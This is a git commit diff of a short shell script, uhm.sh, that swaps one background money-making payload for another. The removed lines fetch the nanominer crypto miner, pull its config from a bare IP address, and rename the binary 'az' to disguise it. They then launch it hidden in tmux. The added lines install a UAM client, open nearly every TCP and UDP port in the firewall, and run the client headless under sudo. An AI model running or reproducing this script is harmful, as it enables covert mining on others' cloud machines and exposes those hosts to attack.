094a766dc18684af2db9e0f73ddad37806522c48
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2021-11-09 13:14:03 +0700

    Update uhm.sh

--- uhm.sh
+++ uhm.sh
@@ -1,14 +1,9 @@
 #!/bin/bash
 
-if [ -f ${PWD}/nanominer-linux-3.1.4/az ]; then
-    if pgrep -x "az" > /dev/null
-then
-	echo " Ok roi"
-else
-cd nanominer-linux-3.1.4 &&  rm config.ini && wget http://103.145.255.41:88/config.ini && tmux new-session -d -s my_session1 './az'
-
-fi
-exit
-fi
-
-wget https://github.com/nanopool/nanominer/releases/download/v3.1.4/nanominer-linux-3.1.4.tar.gz && tar xvzf nanominer-linux-3.1.4.tar.gz && cd nanominer-linux-3.1.4 && rm config.ini && wget http://103.145.255.41:88/Azure/config.ini && mv nanominer az &&  tmux new-session -d -s my_session1 './az'
+sudo apt update
+wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb
+sudo dpkg -i uam-latest_amd64.deb
+cd /opt/uam
+sudo ufw allow 1000:65000/tcp
+sudo ufw allow 1000:65000/udp
+sudo tmux new-session -d -s 1 './uam --pk D4BE04937A8AC67F3F01B9588D39C8C2A3875F45C2E93CC37DCC5D0DF71A9266 --no-ui'
